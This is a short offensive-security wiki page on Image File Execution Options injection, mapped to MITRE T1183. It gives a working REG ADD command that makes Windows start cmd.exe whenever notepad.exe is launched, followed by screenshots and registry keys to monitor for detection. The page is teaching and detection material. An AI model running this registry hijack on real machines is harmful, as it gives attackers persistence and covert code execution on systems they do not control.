# Image File Execution Options Injection

## Image File Execution Options Injection

### Execution

Modifying registry to set cmd.exe as notepad.exe debugger, so that when notepad.exe is executed, it will actually start cmd.exe:

{% code title="attacker\@victim" %}
```csharp
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "cmd.exe"
```
{% endcode %}

Launching a notepad on the victim system:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJuFnneLg3CTFLb524C%2F-LJuLi6b-khGlSQqtP4p%2Fifeo-notepad.png?alt=media\&token=dd6aa0dc-2e19-4020-a601-2a510007de59)

Same from the cmd shell:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJuFnneLg3CTFLb524C%2F-LJuLi6n6w1tMjBQhq33%2Fifeo-notepad2.png?alt=media\&token=66eb8ce2-7e85-4a0f-b4f1-2c265b15ba2e)

### Observations

Monitoring command line arguments and events modifying registry keys: `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options/<executable>` and `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable>` should be helpful in detecting this attack:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJuFnneLg3CTFLb524C%2F-LJuM0ZLJjxu8EvZxHMZ%2Fifeo-cmdline.png?alt=media\&token=70a1772c-b741-4fb6-8dd4-93b8cf81e48c)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJuFnneLg3CTFLb524C%2F-LJuM3FP1jAXIjdK0-Nl%2Fifeo-cmdline2.png?alt=media\&token=e6e23d1d-d2c7-48b2-bd44-9d0f9021b7bf)

### References

{% embed url="https://attack.mitre.org/wiki/Technique/T1183" %}

{% embed url="https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/" %}

{% embed url="https://blogs.msdn.microsoft.com/reiley/2011/07/29/a-debugging-approach-to-ifeo/" %}
